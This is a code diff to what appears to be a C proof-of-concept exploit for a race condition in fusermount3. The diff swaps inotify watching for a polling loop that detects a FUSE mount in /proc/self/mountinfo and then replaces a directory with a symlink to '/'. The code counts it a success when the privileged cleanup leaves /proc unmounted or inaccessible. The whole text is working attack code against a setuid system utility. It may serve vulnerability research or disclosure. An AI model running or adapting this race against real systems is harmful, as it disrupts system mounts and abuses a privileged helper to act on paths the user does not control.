@@ -15,12 +15,10 @@
 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
-#include <poll.h>
 #include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/inotify.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/types.h>
@@ -158,22 +156,25 @@ static int create_comm_socket(void)
 	return fd;
 }
 
-static int watch_mountinfo(void)
+static int mount_visible(const char *target)
 {
-	int fd = inotify_init1(IN_CLOEXEC);
+	FILE *fp;
+	char line[8192];
+	int visible = 0;
 
-	if (fd < 0) {
-		perror("[race] inotify_init1");
+	fp = fopen("/proc/self/mountinfo", "r");
+	if (fp == NULL)
 		return -1;
+
+	while (fgets(line, sizeof(line), fp) != NULL) {
+		if (strstr(line, target) != NULL && strstr(line, "fuse") != NULL) {
+			visible = 1;
+			break;
+		}
 	}
 
-	if (inotify_add_watch(fd, "/proc/self/mountinfo", IN_MODIFY) < 0) {
-		perror("[race] inotify_add_watch mountinfo");
-		close(fd);
-		return -1;
-	}
-
-	return fd;
+	fclose(fp);
+	return visible;
 }
 
 static int proc_is_gone(void)
@@ -214,27 +215,20 @@ static int attempt_chain(int attempt)
 {
 	char root[PATH_MAX], base[PATH_MAX], target[PATH_MAX], moved[PATH_MAX];
 	char fd_env[64];
-	char event_buf[4096];
-	struct pollfd pfd;
 	struct timespec start;
 	pid_t child;
-	int comm_fd = -1, ino_fd = -1;
+	int comm_fd = -1;
 	int status = 0;
-	int saw_event = 0;
-	long long event_us = -1, swap_us = -1, exit_us = -1;
+	int saw_mount = 0;
+	long long detect_us = -1, swap_us = -1, exit_us = -1;
 
 	if (setup_paths(root, sizeof(root), base, sizeof(base), target,
 			sizeof(target), moved, sizeof(moved)) != 0)
 		return -1;
 
 	comm_fd = create_comm_socket();
-	ino_fd = watch_mountinfo();
-	if (comm_fd < 0 || ino_fd < 0) {
+	if (comm_fd < 0) {
 		cleanup_paths(root, base, target, moved);
-		if (comm_fd >= 0)
-			close(comm_fd);
-		if (ino_fd >= 0)
-			close(ino_fd);
 		return -1;
 	}
 
@@ -246,7 +240,6 @@ static int attempt_chain(int attempt)
 		perror("[attempt] fork");
 		cleanup_paths(root, base, target, moved);
 		close(comm_fd);
-		close(ino_fd);
 		return -1;
 	}
 
@@ -258,33 +251,59 @@ static int attempt_chain(int attempt)
 		_exit(127);
 	}
 
-	pfd.fd = ino_fd;
-	pfd.events = POLLIN;
-	if (poll(&pfd, 1, 5000) > 0 && (pfd.revents & POLLIN)) {
-		(void)read(ino_fd, event_buf, sizeof(event_buf));
-		saw_event = 1;
-		event_us = usec_since(&start);
+	for (;;) {
+		int visible;
+		pid_t child_res;
+		long long elapsed_us = usec_since(&start);
+
+		if (elapsed_us > 5000000LL)
+			break;
+
+		visible = mount_visible(target);
+		if (visible > 0) {
+			saw_mount = 1;
+			detect_us = elapsed_us;
+			break;
+		}
+
+		child_res = waitpid(child, &status, WNOHANG);
+		if (child_res == child) {
+			printf("[attempt %d] fusermount3 exited before mount was visible; status=%d\n",
+			       attempt, status);
+			close(comm_fd);
+			cleanup_paths(root, base, target, moved);
+			return 1;
+		}
+		if (child_res < 0) {
+			perror("[attempt] waitpid");
+			close(comm_fd);
+			cleanup_paths(root, base, target, moved);
+			return -1;
+		}
+
+		usleep(50);
+	}
+
+	if (saw_mount) {
 		if (rename(base, moved) == 0 && symlink("/", base) == 0) {
 			swap_us = usec_since(&start);
-			printf("[attempt %d] mountinfo event at %lld us; swap completed at %lld us\n",
-			       attempt, event_us, swap_us);
+			printf("[attempt %d] FUSE mount visible at %lld us; swap completed at %lld us\n",
+			       attempt, detect_us, swap_us);
 		} else {
-			printf("[attempt %d] swap failed after event: %s\n",
+			printf("[attempt %d] swap failed after mount detection: %s\n",
 			       attempt, strerror(errno));
 		}
 	} else {
-		printf("[attempt %d] no mountinfo event before timeout\n", attempt);
+		printf("[attempt %d] FUSE mount not visible before timeout\n", attempt);
 		kill(child, SIGTERM);
 		if (wait_child_timeout(child, &status, 1000) == 2) {
 			printf("[attempt %d] fusermount3 did not terminate; aborting probe\n",
 			       attempt);
 			close(comm_fd);
-			close(ino_fd);
 			cleanup_paths(root, base, target, moved);
 			return -2;
 		}
 		close(comm_fd);
-		close(ino_fd);
 		cleanup_paths(root, base, target, moved);
 		return 1;
 	}
@@ -295,22 +314,20 @@ static int attempt_chain(int attempt)
 			printf("[attempt %d] fusermount3 did not terminate; aborting probe\n",
 			       attempt);
 			close(comm_fd);
-			close(ino_fd);
 			cleanup_paths(root, base, target, moved);
 			return -2;
 		}
 		if (wait_res != 0)
-		printf("[attempt %d] fusermount3 did not exit before timeout; killed child\n",
-		       attempt);
+			printf("[attempt %d] fusermount3 did not exit before timeout; killed child\n",
+			       attempt);
 	}
 	exit_us = usec_since(&start);
 	printf("[attempt %d] fusermount3 exited after %lld us with status=%d\n",
 	       attempt, exit_us, status);
 
 	close(comm_fd);
-	close(ino_fd);
 
-	if (saw_event && proc_is_gone()) {
+	if (saw_mount && proc_is_gone()) {
 		printf("[attempt %d] SUCCESS: /proc is inaccessible after real fusermount3 cleanup\n",
 		       attempt);
 		return 0;
